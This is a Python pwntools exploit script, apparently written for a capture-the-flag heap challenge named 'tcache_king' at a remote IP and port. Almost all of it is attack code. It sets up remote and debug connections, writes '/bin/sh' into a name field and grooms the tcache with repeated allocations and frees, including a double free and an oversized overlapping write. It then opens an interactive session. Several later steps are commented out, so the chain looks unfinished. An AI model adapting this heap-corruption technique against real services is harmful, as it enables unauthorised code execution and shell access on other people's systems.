#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 128.199.157.172 --port 20978 ./tcache_king
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./tcache_king')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '128.199.157.172'
port = int(args.PORT or 20978)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *check_alphanumeric_note
# b *0x00005555555551d0
b *add_note
b *change_name
# b *0x0000555555555793
continue
c
c
c
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def add_not(index,size,data):
    io.sendlineafter("oice: ","1")
    io.sendlineafter("index: ",str(index))
    io.sendlineafter("size: ",str(size))
    io.sendlineafter("contents: ",str(data))

def delet(index):
    io.sendlineafter("oice: ","2")
    io.sendlineafter("index: ",str(index))

def change_name(data):
    io.sendlineafter("oice: ","4")
    io.sendlineafter("name: ",str(data))

io.sendline("/bin/sh\x00")

for i in range(7+2):
    add_not(i,0x100,str(i)*8)

add_not(9,20,"9"*8)

for i in range(7):
    delet(i)

delet(8)
delet(7)

add_not(7,0x100,"9"*8)
delet(8)
add_not(8,0x120,"l"*272)

# for i in range(7):
    # delet(i)

# for i in range(7,10):
#     add_not(i,20,str(i)*8)

# io.sendlineafter("oice: ","5")
# add_not(-7,20,"s"*7)

io.interactive()

